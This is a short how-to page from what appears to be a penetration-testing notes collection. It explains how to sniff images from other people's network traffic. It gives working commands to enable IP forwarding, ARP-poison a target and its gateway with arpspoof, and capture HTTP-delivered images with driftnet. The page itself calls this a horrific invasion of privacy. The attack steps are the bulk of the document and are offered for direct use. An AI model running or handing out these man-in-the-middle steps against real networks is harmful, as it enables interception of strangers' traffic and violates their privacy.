### Driftnet with ARP Poisoning

---

![Driftnet with ARP Poisoning](/images/sniffing/driftnet_with_ARP_Poisoning.png)
Driftnet watches network traffic, and picks out and displays JPEG and GIF images for display. It is a horrific invasion of privacy and shouldn’t be used by anyone anywhere. It can also extract MPEG audio data from the network and play it. If you live in a house with thick walls, this may be a useful way to find out about your neighbours’ musical taste.
[Source](https://github.com/deiv/driftnet)

### Installing:

```
sudo apt install driftnet
```

### Preparing the mechanine:

As root:

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### ARP Poisoning:

As any user we have to create an arp poisoning in two different terminals:

```
sudo arpspoof -i tap0 -t <target 1 ip> -r <target 2 ip or gateway>
```

```
sudo arpspoof -i tap0 -t <target 2 ip or gateway> -r <target 1 ip>
```

In order to begin collecting images:

```
sudo driftnet -i <network interface>
```

The article image is a live example of HTTP delivered website and you can observe all the icons and the placeholder images.

---

[Sniffing](/sniffing/sniffing_readme.md)  [HOME Page](/README.md)
